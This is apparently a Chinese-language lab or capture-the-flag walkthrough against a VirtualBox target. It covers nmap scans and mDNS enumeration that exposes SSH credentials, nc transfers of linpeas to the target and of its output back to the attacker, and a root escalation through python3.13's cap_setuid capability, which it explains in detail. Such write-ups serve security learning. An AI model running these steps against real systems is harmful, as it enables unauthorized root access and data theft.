```text
└─$ nmap -sn 192.168.56.0/24          
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-30 23:54 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.1
Host is up (0.00034s latency).
MAC Address: 0A:00:27:00:00:06 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00012s latency).
MAC Address: 08:00:27:91:6F:E5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.143
Host is up (0.00081s latency).
MAC Address: 08:00:27:4F:53:5E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.147
Host is up (0.0028s latency).
MAC Address: 08:00:27:6B:4A:02 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.84 seconds
                                                                   
```

ip:192.168.56.147

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -p- -sC -sV 192.168.56.147
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-30 23:55 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.147
Host is up (0.0012s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u2 (protocol 2.0)
MAC Address: 08:00:27:4F:53:5E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.89 seconds
                                                                
```

可以发现只是开放了22端口，尝试对UDP协议进行扫描

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -sU --top-ports 100 -sV 192.168.56.147
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-01 00:06 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled.
Nmap scan report for 192.168.56.147
Host is up (0.00077s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT     STATE         SERVICE VERSION
68/udp   open|filtered dhcpc
5353/udp open          mdns    DNS-based service discovery
MAC Address: 08:00:27:4F:53:5E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.87 seconds

```

发现开放了协议为UDP的68、5353端口


```
sudo systemctl start avahi-daemon
sudo systemctl enable avahi-daemon

开启Avahi进程，使用avahi-browse -r -a -t获取信息

┌──(kali㉿kali)-[~/Desktop]
└─$ avahi-browse -r -a -t             
+   eth0 IPv4 debian SSH                                    SSH Remote Terminal  local
=   eth0 IPv4 debian SSH                                    SSH Remote Terminal  local
   hostname = [debian.local]
   address = [192.168.56.147]
   port = [22]
   txt = ["username=user password=Aroipo902!"]
```

获得ssh的登入凭据user:Aroipo902!


提权

1、上传linpeas.sh

```
kali
nc -lvp 4444 < linpeas.sh

靶机
nc 192.168.56.102 4444 > lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh | tee /tmp/lpout.txt


信息回传
靶机
nc 192.168.56.102 5555 < /tmp/lpout.txt
kali
nc -lvp 5555 > lpout.txt
```

根据linpeas.sh扫描的结果，可以得到/usr/bin/python3.13 cap_setuid=ep

这个表面Python 3.13二进制文件具有 cap_setuid的能力，其中ep表示有效和允许，允许它将自己的进程用户ID设置为任意值（包括0，即root）


```
python3.13 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```
user@debian:/$ python3.13 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:/# id
uid=0(root) gid=1000(user) groupes=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
root@debian:/# 

```


```
========================================
  提权命令详解
========================================

【完整命令】
python3.13 -c 'import os; os.setuid(0); os.system("/bin/bash")'

【逐词解析】
1. python3.13
   -> 调用 Python 3.13 解释器。
   -> 关键点：此二进制文件被系统授予了 cap_setuid 能力（LinPEAS 扫描结果），
      因此它运行的进程拥有普通用户不具备的特殊权限。

2. -c
   -> Python 命令行参数，表示 "command"。
   -> 告诉解释器直接执行后面引号内的字符串代码。

3. 'import os; os.setuid(0); os.system("/bin/bash")'
   -> 三行代码用分号串联，按顺序执行：

   a. import os
      -> 导入 Python 的 OS 模块，提供与操作系统交互的函数。

   b. os.setuid(0)
      -> 核心提权函数！
      -> setuid() 是 Linux 系统调用，用于设置当前进程的用户 ID。
      -> 参数 "0" 代表 root 用户的 UID（超级管理员）。
      -> 执行这行时，Python 进程将自己的身份从 user (uid=1000) 切换为 root (uid=0)。

   c. os.system("/bin/bash")
      -> 在完成身份切换后，启动一个 /bin/bash 交互式 Shell。
      -> 由于当前进程已是 root，新启动的 bash 也继承 root 权限。
      -> 因此用户获得了一个 root 权限的命令行终端（提示符变为 #）。

【为什么这条命令能够成功？】
- 正常情况下，普通用户执行 os.setuid(0) 会报错："Operation not permitted"。
- 但 LinPEAS 发现 /usr/bin/python3.13 具备 cap_setuid=ep。
- Linux Capabilities 将 root 的完整权限拆分为独立单元：
    cap_setuid = 允许进程改变其 UID。
    ep = Effective + Permitted（该能力生效且可用）。
- 这意味着：虽然 user 没有 sudo 权限，但系统允许 python3.13 进程
  调用 setuid() 切换到任何用户，包括 root。

【总结公式】
拥有 cap_setuid 能力的解释器 + os.setuid(0) + 启动 Shell = 一键 Root。

========================================
```